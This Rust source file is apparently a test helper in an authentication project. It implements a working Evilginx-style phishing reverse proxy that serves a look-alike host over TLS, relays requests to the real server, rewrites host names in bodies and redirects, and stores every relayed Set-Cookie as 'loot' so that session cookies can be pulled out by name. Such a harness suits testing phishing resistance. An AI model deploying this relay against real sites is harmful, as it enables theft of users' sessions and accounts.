//! A transparent reverse proxy in the Evilginx style (SA-12, OP-159 m.3 (hh)): it serves the
//! phishing host over its own TLS certificate, relays every request to the real server under
//! the real host, rewrites the host in bodies and redirects both ways, and keeps every
//! `Set-Cookie` it relays.

use std::net::SocketAddr;
use std::sync::{Arc, Mutex};

use access_local_client::http::Http;
use axum::body::{Body, to_bytes};
use axum::extract::{Request, State};
use axum::response::Response;

const MAX_BODY: usize = 1024 * 1024;
const RELAYED: &[&str] = &["cookie", "idempotency-key", "dpop", "authorization"];

struct Relay {
    upstream: Http,
    real_host: String,
    phish_host: String,
    loot: Arc<Mutex<Vec<String>>>,
}

/// The running proxy.
pub(super) struct Proxy {
    pub(super) addr: SocketAddr,
    pub(super) loot: Arc<Mutex<Vec<String>>>,
    stop: tokio::sync::oneshot::Sender<()>,
    served: tokio::task::JoinHandle<()>,
}

impl Proxy {
    /// The `name=value` of every relayed cookie called `name`.
    pub(super) fn captured(&self, name: &str) -> Vec<String> {
        let prefix = format!("{name}=");
        self.loot
            .lock()
            .unwrap()
            .iter()
            .filter_map(|c| c.split(';').next())
            .filter(|nv| nv.starts_with(&prefix) && nv.len() > prefix.len())
            .map(str::to_owned)
            .collect()
    }

    pub(super) async fn stop(self) {
        let _ = self.stop.send(());
        let _ = self.served.await;
    }
}

async fn relay(State(s): State<Arc<Relay>>, req: Request) -> Response {
    let method = req.method().as_str().to_owned();
    let path = req
        .uri()
        .path_and_query()
        .map_or_else(|| String::from("/"), |p| p.as_str().to_owned());
    let mut headers: Vec<(String, String)> = Vec::new();
    for name in RELAYED {
        if let Some(v) = req.headers().get(*name).and_then(|v| v.to_str().ok()) {
            headers.push(((*name).to_owned(), v.replace(&s.phish_host, &s.real_host)));
        }
    }
    let content_type = req
        .headers()
        .get("content-type")
        .and_then(|v| v.to_str().ok())
        .map(str::to_owned);
    let body = to_bytes(req.into_body(), MAX_BODY)
        .await
        .unwrap_or_default();
    let body = String::from_utf8_lossy(&body).replace(&s.phish_host, &s.real_host);
    let borrowed: Vec<(&str, &str)> = headers
        .iter()
        .map(|(n, v)| (n.as_str(), v.as_str()))
        .collect();
    let upstream = s
        .upstream
        .request(
            &method,
            &format!("https://{}{path}", s.real_host),
            &borrowed,
            content_type.as_deref().map(|ct| (ct, body.as_bytes())),
        )
        .await;
    let Ok(answer) = upstream else {
        return Response::builder().status(502).body(Body::empty()).unwrap();
    };
    let mut out = Response::builder().status(answer.status);
    for (name, value) in &answer.headers {
        match name.as_str() {
            "set-cookie" => {
                s.loot.lock().unwrap().push(value.clone());
                out = out.header("set-cookie", value.as_str());
            }
            "location" => {
                out = out.header("location", value.replace(&s.real_host, &s.phish_host));
            }
            "content-type" | "retry-after" | "dpop-nonce" | "www-authenticate" => {
                out = out.header(name.as_str(), value.as_str());
            }
            _ => {}
        }
    }
    let text = String::from_utf8_lossy(&answer.body).replace(&s.real_host, &s.phish_host);
    out.body(Body::from(text)).unwrap()
}

/// Starts the proxy for `phish_host` (served with `cert` and `key`, PEM) in front of
/// `real_host`, reached through `upstream`.
pub(super) async fn start(
    upstream: Http,
    real_host: &str,
    phish_host: &str,
    cert: &str,
    key: &str,
) -> Proxy {
    let loot = Arc::new(Mutex::new(Vec::new()));
    let state = Arc::new(Relay {
        upstream,
        real_host: real_host.to_owned(),
        phish_host: phish_host.to_owned(),
        loot: Arc::clone(&loot),
    });
    let app = axum::Router::new().fallback(relay).with_state(state);
    let config = access_http::tls::server_config(cert.as_bytes(), key.as_bytes(), None).unwrap();
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let (stop, stopped) = tokio::sync::oneshot::channel::<()>();
    let served = tokio::spawn(async move {
        let _ = access_http::tls::serve(listener, config, app, async {
            let _ = stopped.await;
        })
        .await;
    });
    Proxy {
        addr,
        loot,
        stop,
        served,
    }
}
